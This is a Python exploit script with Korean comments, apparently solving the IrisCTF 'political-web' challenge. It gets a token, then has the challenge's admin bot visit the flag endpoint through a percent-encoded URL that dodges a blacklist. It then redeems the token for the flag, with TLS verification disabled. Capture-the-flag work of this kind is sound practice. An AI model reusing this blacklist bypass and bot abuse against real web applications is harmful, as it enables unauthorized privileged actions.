import requests
import time
import urllib3
import socket

# 서버 URL
WEB_URL = "https://political-web.chal.irisc.tf"
BOT_HOST = "political-bot.chal.irisc.tf"
BOT_PORT = 1337

def send_to_bot(token):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((BOT_HOST, BOT_PORT))
    
    # 1. proof-of-work 메시지 받기
    pow_msg = sock.recv(1024).decode()
    print(f"[+] PoW 메시지: {pow_msg}")
    
    # 2. "Please send me a URL" 메시지 받기
    url_msg = sock.recv(1024).decode()
    print(f"[+] URL 요청 메시지: {url_msg}")
    
    # 3. URL 전송 (블랙리스트 우회)
    # URL 인코딩을 사용하여 블랙리스트 우회
    exploit_url = f"{WEB_URL}/g%69v%65fl%61g?t%6Fk%65n={token}"
    print(f"[+] 봇에게 전송할 URL: {exploit_url}")
    sock.send(f"{exploit_url}\n".encode())
    
    # 4. 봇의 응답 받기
    try:
        response = sock.recv(1024).decode()
        print(f"[+] 봇 응답: {response}")
    except:
        print("[+] 봇이 응답하지 않음 (타임아웃 - 정상)")
    
    sock.close()

def exploit():
    # 1. 새로운 토큰 받기
    token = requests.get(f"{WEB_URL}/token", verify=False).text.strip()
    print(f"[+] 받은 토큰: {token}")

    # 2. 봇에게 토큰 전송
    send_to_bot(token)

    # 3. 충분한 대기 시간
    print("[+] 처리 대기 중 (3초)...")
    time.sleep(3)

    # 4. 토큰으로 플래그 획득 시도
    data = {"token": token}
    response = requests.post(f"{WEB_URL}/redeem", data=data, verify=False)
    print(f"[+] 플래그 응답: {response.text}")

if __name__ == "__main__":
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit()